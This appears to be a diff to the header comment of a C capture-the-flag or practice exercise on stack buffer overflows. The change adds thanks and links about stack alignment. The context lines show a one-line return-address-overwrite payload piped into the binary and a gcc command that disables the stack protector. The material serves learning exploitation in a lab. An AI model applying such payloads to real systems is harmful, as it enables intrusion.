@@ -10,6 +10,10 @@
  * non-16-byte aligned.
  * cat <(python3 -c "print('backup' + 'A'*26 + 'B'*8 + '\x5b\x12\x40')") - | ./ret2normal
  * gcc -O0 -fno-stack-protector -no-pie pwn3.c -o pwn3
+ *
+ * Thanks to these two sources for helping me understand the movaps segfault and stack alignment issue:
+ * http://blog.binpang.me/2019/07/12/stack-alignment/#reference
+ * https://pwndumb.github.io/posts/Docker-CTF-LiverOverflow-Challenge/
  */
 
 void debugShell() {
